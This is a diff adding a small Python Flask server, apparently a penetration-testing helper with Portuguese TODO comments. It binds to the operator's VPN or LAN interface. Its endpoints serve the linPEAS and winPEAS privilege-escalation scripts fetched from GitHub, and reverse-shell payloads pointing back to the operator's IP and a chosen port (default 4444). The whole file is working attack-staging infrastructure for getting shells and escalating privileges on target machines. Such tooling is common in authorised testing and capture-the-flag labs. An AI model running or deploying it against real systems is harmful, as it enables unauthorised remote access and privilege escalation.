@@ -1,0 +1,69 @@
+#!/usr/bin/env python3
+from flask import Flask, request
+import requests
+from netifaces import interfaces, ifaddresses, AF_INET
+import sys
+
+# TODO:
+# Criar um README.MD
+# Criar um --help explicando cada rota
+# Criar um arquiho de config (.bing_config)
+
+app = Flask(__name__, static_folder='', static_url_path='')
+net_interfaces = interfaces()
+
+def get_interface():
+  interfaces = ['tun0', 'eth0', 'wlan0']
+  for i in interfaces:
+    if i in net_interfaces:
+      interface = i
+      break
+  if interface not in interfaces:
+    interface = net_interfaces[1]
+  return ifaddresses(interface)[2][0]['addr']
+
+def get_linpeas():
+    url = "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
+    r = requests.get(url)
+    return r.text
+
+def get_winpeas():
+    url = 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat'
+    r = requests.get(url)
+    return r.text
+
+def get_rev_shell(ip,port):
+    url = f'https://reverse-shell.sh/{ip}:{port}'
+    r = requests.get(url)
+    return r.text
+
+@app.route('/<path:path>')
+def static_file(path):
+    return app.send_static_file(path)
+
+@app.route('/linpeas')
+def linpeas():
+    return get_linpeas()
+
+@app.route('/winpeas')
+def winpeas():
+    return get_winpeas()
+
+@app.route("/revshell", defaults={"port": "4444"})
+@app.route('/revshell/<port>')
+def revshell(port):
+    ip = get_interface()
+    return get_rev_shell(ip,port)
+
+if __name__ == '__main__':
+    print('Endpoints: /linpeas, /winpeas, /revshell and /revshell/<port>')
+    cli = sys.modules['flask.cli']
+    cli.show_server_banner = lambda *x: None
+    if len(sys.argv) > 1 and int(sys.argv[1]) < 65535 and int(sys.argv[1]) >= 1:
+      try:
+        app.run(host=get_interface(), port=sys.argv[1])
+      except ValueError:
+        print('You can only use numbers as ports.')
+
+    else:
+      app.run(host=get_interface(), port=8000)
